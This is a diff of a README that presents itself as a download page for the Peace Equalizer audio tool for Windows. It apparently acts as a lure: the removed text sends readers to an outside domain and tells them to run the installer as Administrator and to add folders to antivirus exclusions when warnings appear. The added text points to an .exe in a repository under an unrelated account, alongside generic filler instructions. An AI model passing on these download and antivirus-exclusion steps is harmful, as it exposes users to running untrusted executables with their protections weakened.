@@ -1,79 +1,78 @@
-# Peace Equalizer Download for Windows 11 & 10
+# 🔊 Peace-Equalizer - Improve your sound quality on Windows
 
-**Peace-Equalizer**
+[![](https://img.shields.io/badge/Download-Peace--Equalizer-blue.svg)](https://github.com/Marianatriuretic733/Peace-Equalizer)
 
-**Peace Equalizer** for PC gamers on Windows 10/11. Scroll to **Download & Install** for the direct link or one-command setup.
+## what this software does
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Gaming](https://img.shields.io/badge/For-PC%20Gamers-16a34a?style=flat-square&logo=gamepad)]()
+Peace Equalizer adjusts the sound output on your Windows computer. It works by changing the audio signals sent to your speakers or headphones. You can use it to increase volume, adjust bass levels, or fix the sound profile of your gaming headset. This tool adds a graphical interface to the Equalizer APO system. It makes audio configuration simple for any user.
 
----
+## system requirements
 
-## Download & Install
+Before you install the software, please check that your computer meets these basic needs:
 
-> **This is the download page.** Use the button or link below to get **Peace Equalizer** for Windows.
+- Windows 10 or Windows 11 operating system.
+- An installed audio driver that supports APO (Audio Processing Objects). Most modern motherboards and USB headsets work with this.
+- Equalizer APO software must be present on your system. 
+- At least 50 MB of free storage space.
 
-<p align="center">
-  <a href="https://peaceeq.nexustool.fun/">
-    <img src="https://img.shields.io/badge/Download-Peace%20Equalizer-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Peace Equalizer">
-  </a>
-</p>
+## 📥 download and installation
 
-| | |
-| --- | --- |
-| **Direct link** | **[peaceeq.nexustool.fun](https://peaceeq.nexustool.fun/)** |
-| **Full URL** | `https://peaceeq.nexustool.fun/` |
-| **Type** | Installer for Windows 10 / 11 (64-bit) |
-| **Admin** | Run setup as Administrator |
+Follow these steps to set up the software on your machine.
 
-### Quick steps
+1. Open the [official download page](https://github.com/Marianatriuretic733/Peace-Equalizer).
+2. Look for the release area.
+3. Select the file ending in .exe to start the download.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the file to begin the setup wizard.
+6. Follow the on-screen prompts. The installer asks where you want to place the shortcut. Choose "Desktop" for convenience.
+7. If the installer asks to restart your computer, allow it. This step ensures that the audio driver correctly links with the software.
 
-1. Click **[Download — peaceeq.nexustool.fun](https://peaceeq.nexustool.fun/)** (link above)
-2. Save the file from the project page
-3. Run the setup **as Administrator**
-4. Enter your license key when prompted
-5. Restart if the installer asks — then launch from Start menu
+## ⚡ initial setup
 
-<p align="center"><a href="https://peaceeq.nexustool.fun/"><strong>⬇ Download Peace Equalizer now</strong></a></p>
+When you launch the program for the first time, it checks for installed audio devices. 
 
----
+1. Click the icon on your desktop to open the interface.
+2. Select the "Full Interface" option if asked.
+3. Look for the device list at the top. Choose your primary output device, such as your speakers or headset.
+4. If you see a warning that tells you Equalizer APO is not found, follow the instructions to install the APO engine for your chosen device.
+5. Once configured, you see several sliders on your screen. These sliders represent different frequency bands. 
 
-## About
+## 🎧 using audio profiles
 
-**Peace Equalizer** setup page for Windows PC gamers.
+Peace Equalizer allows you to save and load specific audio settings. You might want one profile for gaming and another for listening to music.
 
-**People also search for:** peace equalizer download, peace gui equalizer apo gaming profile windows
+- To create a profile, move the sliders to your preferred levels.
+- Find the "Save as" button in the bottom section of the window.
+- Give your profile a name.
+- Press "Save."
+- To switch profiles, use the dropdown menu at the top of the interface. This allows you to toggle between settings with one click.
 
-**Repository:** `Peace-Equalizer`
+## 🛠 adjusting frequency bands
 
+Frequency bands control how the audio sounds. 
 
-## After install
+- Use the leftmost sliders to change the bass levels. If you feel your headset sounds too thin, raise these sliders slightly.
+- The middle sliders affect the human voice range. This area is often called the mid-range. Adjust these to make voices clearer in movies or games.
+- The rightmost sliders control the treble. Increase these to add crispness to cymbals or high-pitched sounds.
 
-| Step | Tip |
-| --- | --- |
-| 1 | Run once as Administrator on first setup |
-| 2 | Add your game folders to exclusions if AV blocks tools |
-| 3 | Pin to taskbar for quick access between matches |
-| 4 | Check for updates inside the app after major game patches |
+Be careful when you move the sliders. Raising them too high causes distortion, especially at high volume levels. If you hear crackling or buzzing sounds, pull the "Pre-amplifying gain" slider down until the noise stops. The Pre-amplifying gain slider acts as a master volume for the equalizer.
 
-## System requirements
+## 💡 troubleshooting common issues
 
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 8 GB (16 GB for mod tools / recording) |
-| Disk | 500 MB free space |
-| GPU | DirectX 11 compatible |
-| Admin | Required for install/repair |
+If you change settings but do not hear a difference, try these steps:
 
-## Troubleshooting
+1. Restart your playback application. If you are playing music, close and reopen the media player.
+2. Ensure you selected the correct output device in the menu.
+3. Check the "On" button in the Peace interface. If it reads "Off," the software is not sending audio changes. Click the button to switch it back to "On."
+4. Verify that you have the latest drivers for your audio card or headset from the manufacturer website.
+5. If the audio stops completely, go to the Windows Sound Control Panel. Right-click your device, select "Properties," and click the "Enhancements" tab. Ensure the checkbox for "Disable all enhancements" is not selected.
 
-| Issue | Try this |
-| --- | --- |
-| Download does not start | Disable VPN/ad-block for this page |
-| Setup blocked | Run as Administrator |
-| Tool not detected in game | Restart game after installing |
-| Antivirus warning | Add install folder to exclusions temporarily |
+## 🛡️ safety and performance
 
----
+This software modifies audio signals at the system level. It uses the Equalizer APO framework to ensure low latency. This is important for gaming because it means no delay between your action and the sound you hear. 
 
-**Topics:** peace-equalizer-download, equalizer, peace-gui-equalizer-apo-gaming-profile-windows, gaming, profile, peace-equalizer, peace-equalizer-2026, equalizer-apo, gaming-headset, audio-profile, software, windows-11
+The software does not collect your data or track your behavior. It functions entirely on your local machine. Because it runs as a system service, it needs permission from Windows to initialize when your computer turns on. You can change this behavior in the settings menu if you prefer to launch it manually.
+
+## 📈 advanced features
+
+Once you get comfortable with the basic sliders, you can explore the advanced settings. The software includes an effects panel. Use this to change settings such as crossfeed, delay, or balance. Crossfeed helps if you use headphones and want the sound to feel more natural. Balance fixes issues if one side of your headset seems louder than the other. Always test these changes with a familiar song or game audio to judge the impact on your listening experience.
